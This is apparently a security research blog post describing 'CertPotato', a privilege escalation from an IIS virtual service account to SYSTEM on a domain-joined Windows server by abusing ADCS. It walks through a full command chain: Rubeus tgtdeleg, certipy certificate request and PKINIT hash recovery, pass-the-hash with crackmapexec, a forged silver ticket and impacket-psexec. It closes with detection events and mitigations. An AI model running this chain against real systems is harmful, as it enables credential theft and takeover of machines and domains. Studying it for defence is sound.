---
layout: post
title:  "CertPotato – Using ADCS to privesc from virtual and network service accounts to local system"
category : ADCS
tags :  Privesc AD ADCS Service
---


The goal of this blog post is to present a privilege escalation I found while working on ADCS. We will see how it is possible to elevate our privilege to the NT AUTHORITY\\System from a local service account of a domain-joined machine (for example a webshell on a Windows server).

One of the popular techniques for getting the SYSTEM from a virtual or network service account is [Delegate 2 Thyself](https://exploit.ph/delegate-2-thyself.html) by Charlie Clark. This technique involves using RBCD to elevate your privileges. In this article, I propose an alternative approach to become local SYSTEM using ADCS.

# ADCS 101

## Public Key Infrastructure

A PKI (Public Key Infrastructure) is an infrastructure used to create, manage, and revoke certificates as well as public/private keys.


Active Directory Certificate Service (ADCS) is the Microsoft implementation of a PKI infrastructure in an Active Directory/Windows environment. This service was added on Windows Server 2000, is easy to install and fully integrates itself with the different Microsoft services. For example, here is a non exaustive list of the different usages of a PKI infrastructure:

- TLS certificate (HTTPS / LDAPS / RDP)

- Signing binaries, Powershell scripts or even drivers

- User authentication

- File system encryption

## Certificate template

To simplify the creation of certificates in an Active Directory, there are certificate templates.


These templates are used to specify specific parameters and rights related to the certificate that will be issued from them. For example, in a certificate template we can set the following parameters:

- Period of validity

- Who has the right to enroll

- How we can use these certificates also called Extended Key Usage (EKU)

By default, when the role ADCS is installed,  different default templates are provided. One of them is the template **Machine** which can be requested by any machine accounts member of the Domain Computers domain group: 


![Machine template](/assets/img/CertPotato/template_machine.png)

  
## Request a certificate
A certificate request is always sent to the ADCS server. It is based on a template and requires authentication.

If the request is approved by the certification authority, then the certificate is delivered and usable in line with the EKUs defined in the template.

## User authentification (PKINIT)

Kerberos supports asymmetric authentication, that is PKINIT authentication. Instead of encrypting the timestamp during pre-authentication (KRB_AS_REQ) with a password derivative (NT hash for RC4 encryption), it is possible to sign the timestamp with the private key associated with a valid certificate.

However, for PKINIT authentication to be feasible there are several conditions, one of these conditions is that the obtained certificate must have one of the following 5 EKUs:

- Client Authentification  
- PKINIT Client  Authentification 
- Smart Card Logon 
- Any Purpose 
- SubCA


# The situation
  
In our test environment, we have three machines:

- DC (192.168.1.1): the domain controller (Windows server 2022 fully updated) on which the certificate authority is also located;
- IIS (192.168.1.2): an application server (Windows server 2022 fully updated) on which the IIS service is installed;
- A Kali Linux machine (192.168.1.3).

Let's assume that we have successfully uploaded a web shell on the IIS server. If we run the whoami command we can see the following result:

![whoami](/assets/img/CertPotato/whoami.png)

By default the service account used is `iis apppool\defaultaappool` a Microsoft virtual account. But what is a service account?

## Services accounts

According to Microsoft: "[A service account is a user account that's created explicitly to provide a security context for services that are running on Windows Server operating systems](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn617203(v=ws.11))". On a Windows machine, there are several built-in service accounts:

- LocalSystem (NT AUTHORITY\\SYSTEM);
- NetworkService (NT AUTHORITY\\Network Service);
- LocalService (NT AUTHORITY\\Local Service).

These three accounts have different privileges on the machine. Only the LocalSystem account and the NetworkService account use the computer account, if they need to authenticate to other machines on the internal network.
Services can also be run using alternate accounts like local or domain accounts.  
  
Moreover, since Windows Server 2008 R2, new services accounts were introduced:  
- Standalone managed service accounts (sMSA);  
- Group-managed service accounts (gMSA);  
- Virtual accounts.  

These accounts make management services easier for administrators. For example, password management (complexity, renew, so on) is fully handled by the Active Directory.  
  
Standalone and Group managed services accounts are both domain accounts, so if they need to authenticate to other machines on the network they use their domain credentials. Virtual accounts are defined as local managed services accounts, in a domain context environment if a network authentication is needed the computer account will also be used.
  
Here is a non exhaustive list of services which use virtual accounts to run their applications: IIS, Exchange, MSSQL.

Depending on the installed services there can be more virtual accounts. The **iis apppool\\defaultapppool** account is one of them.

## Back to the topic

If we try to enumerate a remote share from our webshell:


![dir](/assets/img/CertPotato/dir.png)


We will see that it is not the **defaultapppool** account that will try to authenticate to our server but the **IIS$** machine account:
```bash
impacket-smbserer -smb2support test .
```

![smbserver](/assets/img/CertPotato/smbserver.png)

That implies that when requesting remote information, the operating system fallbacks to the machine account of the computer (**IIS$**) to perform the authentication which is a valid account on the Active Directory. Pushing further this principle we can try to list LDAP information using for the example the net binary, indeed we will be able to retrieve the list of the domain users:

![domain users](/assets/img/CertPotato/domain_users.png)

Since we are able to request domain information through LDAP queries we can also retrieve the Certificate Authority information:

```batch
certutil -TCAInfo
```
![CA information](/assets/img/CertPotato/ca_info.png)

As well as information on a specific template (here the default Machine template)

```batch
certutil -dsTemplate Machine
```
![Template information](/assets/img/CertPotato/template_info.png)

> We could relay the machine authentication to the web enrollment service ([ESC8](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)), however we assume here that either the service is not present or that anti-relay measures have been put in place (EPA for example).
{: .prompt-info }

# Abuse this configuration

So, our service IIS run as a virtual account, therefore on domain operations we act as the underlying machine account. Our goal is to target ADCS and request a certificate, but to do that we need the password of the machine account (which requires privessc to begin with), or a usable TGT of it. That’s where TGTdeleg comes into play.

## Get a usable TGT

As Charlie Clark mentions in his [post](https://exploit.ph/delegate-2-thyself.html), Benjamin Delpy found a way to get a usable TGT . This technique is called the [tgtdeleg trick](https://twitter.com/gentilkiwi/status/998219775485661184) and it's also been implemented in [Rubeus](https://github.com/GhostPack/Rubeus#tgtdeleg).

### What is the TGT delegation trick ?

Any account with an SPN record (machine or otherwise) that is granted unconstrained delegation rights is able to impersonate a user to authenticate to any service on any host. Indeed, when a user wants to access a service or a server with this right, in the **AP_REQ** packet, the authenticator will contain a forwardable TGT and the associated session key. The authenticator is encrypted with a different session key issued when the service ticket was requested from the Ticket Granting Service.

So if we manage to retrieve the AP_REQ packet and the key used to encrypt the authenticator, we will be able recover the delegation TGT of our user and its associated session key.

Using the functions of the SSPI/GSS-API, in particular the InitializeSecurityContext() function and providing the targeted SPN, we will obtain a structure (an SSPI SecBuffer structure) that will allow us to recover the **AP_REQ**. For the session key used to encrypt the authenticator, it can be retrieved from the [local Kerberos cache](https://github.com/GhostPack/Rubeus/blob/4c9145752395d48a73faf326c4ae57d2c565be7f/Rubeus/lib/LSA.cs#L1222).

So here's the trick, with our user context, we call the InitializeSecurityContext() function with an SPN of a service or a machine having the unconstrained delegation rights as parameter. By default, domain controllers have this right, so we can choose the SPN `cifs/<dc_fqdn>`. We then extract the **AP_REQ** packet from the SSPI structure. Finally, with the session key retrieved from the local Kerberos cache we can then decrypt the authenticator and retrieve the forwardable TGT of our current user and its associated session key.

### Back to the topic

So we upload Rubeus on the compromised machine, then to obtain a delegation TGT we launch the following command `Rubeus.exe tgtdeleg /nowrap`:


![Rubeus](/assets/img/CertPotato/Rubeus.png)


We obtain a valid TGT in base64. We can now use our Kali machine to request a certificate using **certipy**. To do this, we must first convert the base64 encoded kirbi file into a ccache file:

```bash
cat ticket.kirbi_b64
base64 -d ticket.kirbi_b64 > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
```
![Convert ticket](/assets/img/CertPotato/convert.png)

Once the TGT file is in the right format, you can load it with the command `export KRB5CCNAME_=<path_to_ticket.ccache>` . The **klist** command allows us to list the loaded Kerberos tickets, we can see that we have obtained a TGT as **IIS$**, the machine account.


```bash
klist
export KRB5CCNAME=ticket.ccache
klist
```
![Load ticket](/assets/img/CertPotato/load.png)

  
## Request a machine certificate

Certipy can take TGT tickets loaded with the -k option as parameter. We can use the TGT of our machine account to list the certificate templates:

```bash
certipy find -k -target dc.namek.local
```
![Find templates](/assets/img/CertPotato/find.png)


With our Kerberos ticket, we can then directly request a certificate with the default template **Machine**. Any certificate template with the EKU Client Authentication that our machine account can enroll on could have worked too:

```bash
certipy req -k -ca namek-ca -template Machine -target dc.namek.local
```
![Request certificate](/assets/img/CertPotato/request.png)

As detailed in the article [NTLM relaying to AD CS - On certificates, printers and a little hippo](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) from [Dirk-jan Mollema](https://twitter.com/_dirkjan), with PKINIT authentication and the U2U extension, we can then obtain the hash of the machine account:

```bash
certipy auth -pfx iis.pfx
```
![PKINIT](/assets/img/CertPotato/pkinit.png)

We can then confirm that the account hash is valid by using crackmapexec:

```bash
crackmapexec smb 192.168.1.1 -u 'IIS$' -H 'aad3b435b51404eeaad3b435b51404ee:fde6a3d6d011d112795661ebe7d8e66a' 2>/dev/null
```
![cme](/assets/img/CertPotato/cme.png)

So we managed to get the machine account of a domain-joined machine from a local service account. With the domain-joined machine account, you can then become an administrator on the compromised machine or search for vulnerabilities in the Active Directory.

> An alternative way to upgrade our machine account TGT to a NT hash is to use the [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) technique. Indeed the machine account has the possibility to modify its properties (especially the attribute **msDS-KeyCredentialLink**).
{: .prompt-tip }

## From machine account to SYSTEM

To become SYSTEM with the machine account, we will forge a Silver ticket on the **CIFS** service.  To do this we need the domain SID, an arbitrary username (let's choose **Cellmax**), the full domain name and NT hash of the machine account.

- The domain SID can be obtained anonymously by running **rpcclient** on the domain controller:
```bash
rpcclient -U '%' 192.168.1.1 -c 'lsaquery'
```
![domain_sid](/assets/img/CertPotato/domain_sid.png)

- The full domain name can be obtained with crackmapexec:
```bash
crackmapexec smb 192.168.1.1 2>/dev/null
```
![full_domain](/assets/img/CertPotato/full_domain.png)

Once we have these elements, we can create our silver ticket using **impacket-ticketer**:
```bash
impacket-ticketer -nthash fde6a3d6d011d112795661ebe7d8e66a -domain namek.local -domain-sid S-1-5-21-72261593-2540281417-569969885 -spn cifs/iis.namek.local Cellmax
```
![silver_ticket](/assets/img/CertPotato/silver_ticket.png)

Let's load into our Kerberos ticket using the export command:

```bash
export KRB5CCNAME=Cellmax.ccache
klist
```
![load_silver_ticket](/assets/img/CertPotato/load_silver_ticket.png)

And we can now use the psexec script from the impacket toolkit with the -k and -no-
pass parameters to authenticate to the service using our silver ticket. We are now **SYSTEM** on the server:

```bash
impacket-psexec namek.local/Cellmax@iis.namek.local -k -no-pass
```
![system](/assets/img/CertPotato/system.png)

# Conclusion

ADCS brings a new way to take control of a service account. From a simple shell as NetworkService or Virtual Accounts, we manage to take control of the machine.

Several Windows events are generated when using this technique. During the use of the TGT delegation trick or PKINIT authentication, Kerberos logs are generated (event 4768) on the domain controller, and when interacting with the certification authority (CA), logs are generated on the server where the ADCS role is installed (events 4886, 4887). However, monitoring all these Windows events could be quite complicated as they correspond to normal activity in an Active Directory network.

The gMSA and sMSA accounts can be a solution against this type of attack, however it is necessary to ensure that the rights on the Active Directory of these accounts are sufficiently restrictive. In case of compromision of these services accounts, an attacker could not pivot on the internal network.

# Acknowledgements

- [Olivier Lyak](https://twitter.com/ly4k_) for the [Certipy](https://github.com/ly4k/Certipy) tool and the [associated articles](https://medium.com/@oliverlyak)
- [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_) for the [Certify](https://github.com/GhostPack/Certify) tool and the [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) article
- [Dirk-jan](https://twitter.com/_dirkjan) for the [PKINITtools](https://github.com/dirkjanm/PKINITtools).
- [Benjamin Delpy](https://twitter.com/gentilkiwi) for implementing [delegation TGT on mimikatz](https://twitter.com/gentilkiwi/status/998219775485661184)
- [Charlie Clark](https://exploit.ph/delegate-2-thyself.html) for the inspiring article [Delegate 2 Thyself](https://exploit.ph/delegate-2-thyself.html)
- [Elad Shamir](https://twitter.com/elad_shamir) for the article [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)and for the article [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [Charlie Bromberg](https://twitter.com/_nwodtuhs/) for his [talk](https://youtu.be/7_iv_eaAFyQ ) at the French conference LeHack 2022
- [Will Schroeder](https://twitter.com/harmj0y) again for his [article](https://posts.specterops.io/rubeus-now-with-more-kekeo-6f57d91079b9) explaining the TGT delegation trick.
